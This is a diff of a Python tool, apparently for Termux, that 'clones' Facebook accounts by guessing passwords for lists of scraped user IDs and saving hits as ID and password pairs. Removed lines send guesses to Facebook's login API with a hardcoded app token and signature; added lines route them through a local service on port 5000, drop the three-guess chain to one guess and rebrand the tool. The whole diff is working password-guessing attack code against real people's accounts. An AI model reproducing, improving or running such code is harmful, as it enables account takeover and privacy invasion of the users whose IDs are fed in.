@@ -33,7 +33,6 @@ if not os.path.isfile("/data/data/com.termux/files/home/queen/...../index.js"):
     os.system("fuser -k 5000/tcp &")
     os.system("#")
     os.system("cd ..... && node index.js &")
-    time.sleep(10)
     os.system("clear")
     print("")
     print("")
@@ -87,7 +86,7 @@ def tech_abm():
     print("")
     print("")
     print("")
-    os.system('echo -e "\t infect tool has been update      "| lolcat')
+    os.system('echo -e "\t JAM tool has been update      "| lolcat')
     print("")
     print("")
     print("")
@@ -99,7 +98,7 @@ def tech_abm():
     print("")
     print("")
     print("")
-    os.system('echo -e "\t Welcome to new infect tool       "| lolcat')
+    os.system('echo -e "\t Welcome to new JAM-Fast tool       "| lolcat')
     print("")
     print("")
     print("")
@@ -250,8 +249,6 @@ def a_menu_select():
 		os.system('echo -e "\t    Public ID Menu " | lolcat')
 		os.system('echo -e "-----------------------------------------------"| lolcat')
 		p1 = raw_input(' \033[1;92m[1]Name + digit: ')
-                p2 = raw_input(' \033[1;92m[2]Name + digit: ')
-                p3 = raw_input(' \033[1;92m[3]Name + digit: ')
 		idt = raw_input(" Enter ID/Username :  ")
 		os.system('echo -e "-----------------------------------------------"| lolcat')
 		time.sleep(2)
@@ -290,8 +287,6 @@ def a_menu_select():
 		os.system('echo -e "\t    Followers ID Menu " | lolcat')
 		os.system('echo -e "-----------------------------------------------"| lolcat')
 		p1 = raw_input(' \033[1;92m[1]Name + digit: ')
-                p2 = raw_input(' \033[1;92m[2]Name + digit: ')
-                p3 = raw_input(' \033[1;92m[3]Name + digit: ')
 		idt = raw_input(" Enter ID/Username : ")
 		os.system('echo -e "-----------------------------------------------"| lolcat')
 		time.sleep(2)
@@ -330,8 +325,6 @@ def a_menu_select():
 		print("")
 		print("")
 		p1 = raw_input(' \033[1;92m[1]Name + digit: ')
-                p2 = raw_input(' \033[1;92m[2]Name + digit: ')
-                p3 = raw_input(' \033[1;92m[3]Name + digit: ')
 		try:
 	                uidlist = raw_input('[+] File Name: ')
 			os.system('echo -e "-----------------------------------------------"| lolcat')
@@ -350,6 +343,7 @@ def a_menu_select():
 	os.system("clear")
 	logo()
 	os.system('echo -e "Please wait clone account will be appear here "| lolcat')
+	os.system('echo -e "Fast Tools One Pass Cloing "| lolcat')
 	os.system('echo -e "Dev by : Jam Shahrukh "| lolcat')
 	os.system('echo -e "-----------------------------------------------"| lolcat')
 	
@@ -359,9 +353,9 @@ def a_menu_select():
 		uid,name=user.split("|")
 		try:
 		    pass1 = name.lower() + p1
-                    data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers = header).text
+                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers = header).text
                     q = json.loads(data)
-                    if "access_token" in q:
+                    if "loc" in q:
                         print("\033[1;92m[SANI-OK]➤ " + uid + " | " + pass1+" | "+name)
                         ok=open("ok.txt","a")
                         ok.write(uid+" | "+pass1+"\n")
@@ -372,39 +366,7 @@ def a_menu_select():
                         cp=open("cp.txt","a")
                         cp.write(uid+" | "+pass1+"\n")
                         cp.close()
-                        cps.append(uid + pass1)
-		    else:
-			pass2 = name.lower() + p2
-		        data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers = header).text
-                        q = json.loads(data)
-                        if "access_token" in q:
-                            print("\033[1;92m[SANI-OK]➤ " + uid + " | " + pass2+" | "+name)
-                            ok=open("ok.txt","a")
-                            ok.write(uid+" | "+pass2+"\n")
-                            ok.close()
-                            oks.append(uid + pass2)
-                        elif 'www.facebook.com' in q['error']:
-                            print("\033[1;93m[SANI-CP]➤ " + uid + " | " + pass2+" | "+name)
-                            cp=open("cp.txt","a")
-                            cp.write(uid+" | "+pass2+"\n")
-                            cp.close()
-                            cps.append(uid + pass2)
-		        else:
-			    pass3 = name.lower() + p3
-                            data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers = header).text
-                            q = json.loads(data)
-                            if "access_token" in q:
-                                print("\033[1;92m[SANI-OK]➤ " + uid + " | " + pass3+" | "+name)
-                                ok = open('/sdcard/ids/jam_OK.txt', 'a')
-                                ok=open("ok.txt","a")
-                                ok.close()
-                                oks.append(uid + pass3)
-                            elif 'www.facebook.com' in q['error']:
-                                print("\033[1;93m[SANI-CP]➤ " + uid + " | " + pass3+" | "+name)
-                                cp=open("cp.txt","a")
-                                cp.write(uid+" | "+pass3+"\n")
-                                cp.close()
-				cps.append(uid + pass3)								
+                        cps.append(uid + pass1)								
 		except:
 			pass
 		
@@ -463,8 +425,6 @@ def b_menu_select():
 		os.system('echo -e "\t    Public ID Menu " | lolcat')
 		os.system('echo -e "-----------------------------------------------"| lolcat')
 		pass1 = raw_input(" \033[1;92m[1]Password: ")
-                pass2 = raw_input(" \033[1;92m[2]Password: ")
-                pass3 = raw_input(" \033[1;92m[3]Password: ")
 		idt = raw_input(" Enter ID/Username :  ")
 		os.system('echo -e "-----------------------------------------------"| lolcat')
 		time.sleep(2)
@@ -503,8 +463,6 @@ def b_menu_select():
 		os.system('echo -e "\t    Followers ID Menu " | lolcat')
 		os.system('echo -e "-----------------------------------------------"| lolcat')
 		pass1 = raw_input(" \033[1;92m[1]Password: ")
-                pass2 = raw_input(" \033[1;92m[2]Password: ")
-                pass3 = raw_input(" \033[1;92m[3]Password: ")
 		idt = raw_input(" Enter ID/Username : ")
 		os.system('echo -e "-----------------------------------------------"| lolcat')
 		time.sleep(2)
@@ -543,8 +501,6 @@ def b_menu_select():
 		print("")
 		print("")
 		pass1 = raw_input(" \033[1;92m[1]Password: ")
-                pass2 = raw_input(" \033[1;92m[2]Password: ")
-                pass3 = raw_input(" \033[1;92m[3]Password: ")
 		try:
 	                uidlist = raw_input('[+] File Name: ')
 			os.system('echo -e "-----------------------------------------------"| lolcat')
@@ -563,6 +519,7 @@ def b_menu_select():
 	os.system("clear")
 	logo()
 	os.system('echo -e "Please wait clone account will be appear here "| lolcat')
+	os.system('echo -e "Fast Tools One Pass Cloing "| lolcat')
 	os.system('echo -e "Dev by : Jam Shahrukh "| lolcat')
 	os.system('echo -e "-----------------------------------------------"| lolcat')
 	
@@ -571,9 +528,9 @@ def b_menu_select():
 		user=arg
 		uid,name=user.split('|')
 		try:
-                    data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers = header).text
+                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers = header).text
                     q = json.loads(data)
-                    if "access_token" in q:
+                    if "loc" in q:
                         print("\033[1;92m[SANI-OK]➤ " + uid + " | " + pass1+" | "+name)
                         ok=open("ok.txt","a")
                         ok.write(uid+" | "+pass1+"\n")
@@ -584,37 +541,7 @@ def b_menu_select():
                         cp=open("cp.txt","a")
                         cp.write(uid+" | "+pass1+"\n")
                         cp.close()
-                        cps.append(uid + pass1)
-		    else:
-		        data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers = header).text
-                        q = json.loads(data)
-                        if "access_token" in q:
-                            print("\033[1;92m[SANI-OK]➤ " + uid + " | " + pass2+" | "+name)
-                            ok=open("ok.txt","a")
-                            ok.write(uid+" | "+pass2+"\n")
-                            ok.close()
-                            oks.append(uid + pass2)
-                        elif 'www.facebook.com' in q['error']:
-                            print("\033[1;93m[SANI-CP]➤ " + uid + " | " + pass2+" | "+name)
-                            cp=open("cp.txt","a")
-                            cp.write(uid+" | "+pass2+"\n")
-                            cp.close()
-                            cps.append(uid + pass2)
-		        else:
-                            data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers = header).text
-                            q = json.loads(data)
-                            if "access_token" in q:
-                                print("\033[1;92m[SANI-OK]➤ " + uid + " | " + pass3+" | "+name)
-                                ok=open("ok.txt","a")
-                                ok.write(uid+" | "+pass3+"\n")
-                                ok.close()
-                                oks.append(uid + pass3)
-                            elif 'www.facebook.com' in q['error']:
-                                print("\033[1;93m[SANI-CP]➤ " + uid + " | " + pass3+" | "+name)
-                                cp=open("cp.txt","a")
-                                cp.write(uid+" | "+pass3+"\n")
-                                cp.close()
-				cps.append(uid + pass3)									
+                        cps.append(uid + pass1)									
 		except:
 			pass
 		
